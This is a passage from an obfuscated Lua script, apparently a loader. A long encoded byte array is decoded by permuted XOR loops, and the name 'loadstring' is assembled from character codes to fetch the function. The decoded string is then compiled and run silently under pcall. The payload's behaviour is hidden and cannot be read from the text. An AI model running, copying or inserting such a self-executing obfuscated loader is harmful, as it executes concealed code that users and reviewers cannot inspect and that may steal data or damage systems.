57,13,87,70,198,138,223,18,43,222,34,242,105,180,118,47,123,21,163,242,184,143,173,57,138,213,221,1,69,90,33,87,192,168,231,236,94,46,251,137,188,211,8,6,70,181,211,93,76,16,85,0,82,177,231,172,93,234,57,170,237,187,89,17,85,31,80,148,82,95,12,7,49,149,252,240,44,33,48,54,61,50,110,95,23,92,47,128,134,157,131,71,19,35,103,132,42,115,60,111,110,50,236,155,56,66,101,199,199,205,141,92,62,192,113,216,60,188,116,53,33,49,221,181,234,197,241,238,192,212,192,18,17,81,113,30,131,233,229,236,4,116,234,246,249,228,8,11,31,254,141,7,80,14,4,80,29,250,78,170,31,186,42,242,228,246,44,88,17,46,1,204,27,68,61,83,12,141,139,177,103,59,36,33,122,48,87,10,23,99,47,129,198,142,250,14,120,59,34,133,66,96,123,117,80,126,190,145,123,96,60,133,128,208,133,92,59,222,58,154,230,236,32,109,23,122,163,252,250,160,183,191,196,140,206,80,29,22,5,12,93,191,173,191,9,127,167,254,247,187,80,81,28,254,209,27,6,27,23,28,220,251,5,162,72,177,118,242,185,244,69,46,17,53,74,135,64,77,88,83,202,145,192,133,54,102,45,119,33,62,113,42,27,109,117,202,240,159,143,38,70,97,213,133,122,60,45,45,39,50,183,251,53,32,108,216,216,139,167,30,122,219,130,154,169,160,4,101,42,12,167,174,241,234,171,245,193,142,220,66,21,11,90,18,27,164,170,236,14,103,231,172,237,51,90,21,29,247,140,68,82,65,69,18,141,253,68,162,93,176,109,134,229,42,65,99,10,44,29,152,92,14,74,65,208,212,217,161,97,50,62,56,103,107,104,58,10,126,114,134,128,142,143,95,219,97,129,131,58,103,110,56,98,161,173,169,119,97,113,140,218,130,238,8,91,192,193,209,191,230,119,34,45,107,166,181,171,250,176,153,137,222,206,18,25,126,81,82,79,186,179,203,28,107,235,238,225,37,8,23,29,224,135,11,17,80,7,116,198,251,87,224,93,240,118,235,249,59,89,126,2,43,8,133,16,11,72,11,213,223,152,167,57,39,33,62,51,48,50,113,67,99,121,132,219,214,101,31,223,48,209,207,124,54,125,54,101,160,183,245,101,122,110,139,154,142,31,13,10,157,231,216,253,230,108,122,39,178,164,191,180,241,241,152,134,195,29,93,79,24,81,13,119,252,239,166,8,194,186,248,234,49,80,3,0,247,202,95,1,1,14,70,131,229,89,236,9,34,109,241,164,44,6,35,86,91,30,213,91,65,12,83,219,223,148,227,116,60,58,75,112,96,107,32,86,48,46,134,155,193,86,80,218,58,209,151,96,16,9,153,53,241,173,212,35,54,50,211,187,130,3,16,10,155,231,154,176,165,112,29,104,227,240,245,184,164,249,175,200,209,22,2,24,20,75,22,78,240,182,72,82,225,178,196,155,49,90,3,6,249,89,95,7,89,20,18,255,160,17,91,83,74,57,243,251,107,69,55,2,53,235,152,13,91,94,65,198,201,136,187,98,110,127,62,63,123,107,120,67,38,170,202,138,193,62,73,219,49,217,216,100,34,120,132,65,161,169,174,51,114,41,221,242,146,90,76,73,199,205,145,253,4,108,80,96,231,247,245,177,235,234,178,236,138,66,30,3,20,19,16,19,79,163,82,72,248,243,175,173,41,0,74,114,148,93,69,92,75,15,26,220,248,91,67,21,61,47,240,255,114,42,36,125,115,135,213,7,12,90,17,193,197,204,97,98,43,117,33,80,98,50,120,98,42,250,234,143,134,124,94,181,52,144,82,121,109,60,215,110,179,178,198,101,61,236,145,175,150,19,81,9,180,205,17,186,25,108,14,60,172,253,173,182,167,234,178,172,151,19,30,66,87,82,18,15,88,241,87,94,232,243,167,240,52,116,41,62,175,89,83,92,89,21,30,158,179,94,94,76,46,46,226,185,44,54,62,113,49,219,243,18,65,64,11,155,141,204,97,120,107,55,112,107,97,52,107,127,103,239,199,202,204,106,71,219,192,193,5,104,2,45,194,115,179,172,176,103,61,235,135,200,209,82,16,25,218,193,86,169,2,58,83,112,179,178,226,250,165,166,191,235,202,17,2,67,81,29,16,79,10,178,61,18,151,243,238,60,127,46,87,124,251,90,49,49,13,72,220,144,149,20,82,73,32,90,226,252,60,30,117,42,46,137,247,66,89,1,212,241,144,138,59,122,107,73,97,32,51,18,105,107,38,169,157,131,130,62,198,211,172,193,95,39,99,123,143,53,161,190,181,63,107,247,154,183,144,81,52,86,209,197,6,167,30,113,82,104,172,246,195,231,210,183,237,240,207,31,30,28,16,71,71,84,88,225,86,72,169,177,254,106,116,119,17,108,165,64,83,64,43,15,159,141,218,78,82,78,61,48,182,97,55,59,126,38,105,199,148,66,41,92,155,158,154,128,96,35,108,33,106,211,59,117,105,102,49,233,218,131,142,111,223,192,206,155,29,45,109,125,222,160,241,250,240,37,61,247,201,190,149,93,36,14,141,223,94,161,30,112,14,189,151,193,173,252,179,188,253,234,138,66,2,24,26,19,69,83,88,234,76,28,230,172,182,32,105,32,15,48,146,90,79,88,50,66,139,204,193,79,82,79,56,131,160,33,100,56,55,50,127,137,53,86,111,65,218,219,207,192,49,116,118,192,112,162,48,101,109,63,118,181,158,143,169,117,200,145,135,213,14,23,99,18,219,186,170,162,173,103,38,156,209,164,110,26,24,75,212,195,82,224,7,44,95,187,189,181,180,168,179,242,175,238,90,76,67,4,92,0,68,34,75,173,63,132,186,237,167,123,101,56,23,124,113,13,67,44,48,73,147,255,208,94,0,53,62,222,157,101,42,108,59,62,61,221,121,80,52,68,195,132,217,152,32,196,110,133,106,215,48,34,120,115,119,239,182,144,252,50,218,177,206,192,29,11,107,87,197,252,186,189,171,117,2,242,171,165,28,2,29,75,194,205,76,185,2,64,9,233,227,237,189,238,246,182,252,239,0,69,21,5,68,31,16,68,26,28,74};
local _0x7D0AA4FA6FDA=#_0x25958576531A;
local _0x9A80AE286D46="";
do
local _0xDEF9FEDE72BB="";
local _0xD1B09BB9F90D;for _0xD1B09BB9F90D=1,_0x7D0AA4FA6FDA do
local _0x87FD25B3FE4F=(_0xD1B09BB9F90D*_0xABC63D11A0C8+_0x73EC0794A763)%_0x7D0AA4FA6FDA+1;
local _0x950B8334E231=(_0x69F1BA709A7B*(_0xD1B09BB9F90D%11)+_0xB91954DD396D*(_0xD1B09BB9F90D%23)+_0xC579FBBEC693)%251+1;
_0xDEF9FEDE72BB=_0xDEF9FEDE72BB..string.char(bit32.bxor(_0x25958576531A[_0x87FD25B3FE4F],_0x950B8334E231));
end
local _0x987FD8A65E82=150;
local _0xBC4F967609B7=bit32.bxor(bit32.bxor(_0x7D0AA4FA6FDA,_0x987FD8A65E82),_0x987FD8A65E82);
if #_0xDEF9FEDE72BB~=_0xBC4F967609B7 then return end
end
do
local _0xF5AA93172813;for _0xF5AA93172813=1,_0x7D0AA4FA6FDA do
local _0x8B93B7BDD45D=(_0xF5AA93172813*_0x7DA1A19484A5+_0xE635BE6E0BB2)%_0x7D0AA4FA6FDA+1;
local _0x6F91C4D47553=(_0xF00D7965D963*(_0xF5AA93172813%19)+_0x58906A343F21*(_0xF5AA93172813%7)+_0x86EC4792DC88)%251+1;
_0x9A80AE286D46=_0x9A80AE286D46..string.char(bit32.bxor(_0x25958576531A[_0x8B93B7BDD45D],_0x6F91C4D47553));
end
end
local _0x6049576CB860=string.char(108,111,97,100,115,116,114,105,110,103);
local _0xB919583F042A=(getfenv and getfenv(0) or _G)[_0x6049576CB860] or load;
local _0x1AB0A5DA80DA=_0xB919583F042A(_0x9A80AE286D46);
if _0x1AB0A5DA80DA then pcall(_0x1AB0A5DA80DA) end
